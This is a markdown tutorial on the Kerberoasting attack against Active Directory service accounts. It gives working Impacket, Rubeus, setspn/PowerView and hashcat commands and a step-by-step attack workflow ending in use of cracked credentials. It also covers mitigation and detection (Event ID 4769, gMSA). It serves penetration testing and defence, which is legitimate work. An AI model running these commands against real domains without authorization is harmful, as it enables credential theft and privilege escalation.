# **Kerberoasting Attack**

## **Understanding Kerberoasting**

- **Kerberoasting** is an attack targeting **service accounts** in Active Directory (AD) environments that use **Kerberos authentication**.
- Attackers extract **Service Principal Name (SPN) tickets (TGS - Ticket Granting Service)**, which are encrypted with the service account's password hash.
- These tickets can be cracked offline to recover plaintext passwords, often revealing high-privilege credentials.

---

## **How Kerberoasting Works**

1. **Kerberos Authentication Flow:**

   - Users authenticate to Active Directory and request **Service Tickets (TGS)** to access services.
   - Service accounts have associated SPNs, and their TGS is encrypted with the service account's NTLM hash.

2. **Vulnerability:**

   - Any domain user can request service tickets for **SPNs**.
   - The tickets can be brute-forced offline to recover the service account’s password.

3. **Attack Flow:**
   - **Enumerate SPNs.**
   - **Request TGS for the SPN.**
   - **Extract and crack the TGS offline.**

---

## **Tools and Techniques**

### **Impacket (GetUserSPNs.py):**

- Impacket provides a tool called `GetUserSPNs.py` to perform Kerberoasting.

- **Install Impacket:**

  ```bash
  pip install impacket
  ```

- **Execute Kerberoasting:**
  ```bash
  python3 GetUserSPNs.py <domain>/<user>:<password>@<dc_ip>
  ```
  Example:
  ```bash
  python3 GetUserSPNs.py corp.local/user:Pass123@10.0.0.1
  ```
  - Dumps SPN tickets for service accounts.

---

### **Rubeus (Windows Tool):**

- Rubeus is a Kerberos exploitation tool for Windows.

- **Run Kerberoasting with Rubeus:**
  ```powershell
  Rubeus.exe kerberoast /format:hashcat
  ```
  - Extracts SPN tickets in **hashcat format**.

---

### **Cracking TGS Hash (Offline with Hashcat):**

- **Crack Service Account TGS with Hashcat:**
  ```bash
  hashcat -m 13100 <tgs_hash.txt> /path/to/wordlist.txt
  ```
  - **`-m 13100`** – Hash mode for Kerberos TGS-REP
  - **`tgs_hash.txt`** – Extracted TGS hash
  - **`/path/to/wordlist.txt`** – Wordlist for cracking

---

## **Example SPN Ticket (Hashcat Format):**

```
$krb5tgs$23$*service_account@DOMAIN.LOCAL*$hash
```

---

## **Detection and Mitigation**

### **Mitigation Techniques:**

1. **Strong Service Account Passwords:**
   - Use **complex passwords** (25+ characters) for service accounts.
2. **Reduce Service Account Privileges:**
   - Avoid assigning unnecessary high privileges to service accounts.
3. **SPN Monitoring:**
   - Regularly audit and monitor accounts with SPNs.
4. **Service Account Rotation:**
   - Regularly change service account passwords.
5. **Managed Service Accounts (MSAs):**
   - Use **Group Managed Service Accounts (gMSA)** instead of traditional service accounts.

---

### **Detection Techniques:**

- **Event ID 4769 (Kerberos TGS Request):**
  - Look for multiple TGS requests from the same account.
- **Unusual SPN Requests:**
  - Monitor for domain users requesting TGS tickets for multiple SPNs.

---

## **Testing for Vulnerable Accounts**

- **Identify SPNs in Active Directory:**

  ```powershell
  setspn -T <domain> -Q */*
  ```

- **List SPN Accounts with PowerView:**
  ```powershell
  Get-DomainUser -SPN
  ```

---

## **Example Attack Workflow (Full):**

1. **Enumerate SPNs:**

   ```bash
   python3 GetUserSPNs.py corp.local/user:Pass123@10.10.10.5
   ```

2. **Extract TGS Hash:**

   ```
   $krb5tgs$23$svc_account@corp.local$abcdef123456
   ```

3. **Crack the Hash:**

   ```bash
   hashcat -m 13100 tgs_hash.txt /usr/share/wordlists/rockyou.txt
   ```

4. **Gain Access:**
   - Use cracked credentials to access AD resources.

---

## **Real-World Impact:**

- **Privilege Escalation:**
  - Cracking service account passwords can lead to **domain admin** escalation.
- **Lateral Movement:**
  - Compromised service accounts allow **pivoting** and accessing more resources.
- **Persistence:**
  - Attackers can use cracked accounts to maintain long-term access.

---

## **⚠️Disclaimer⚠️**

This guide is for **educational purposes only**. Unauthorized exploitation of Kerberos is illegal and unethical. Always perform penetration tests with proper authorization.
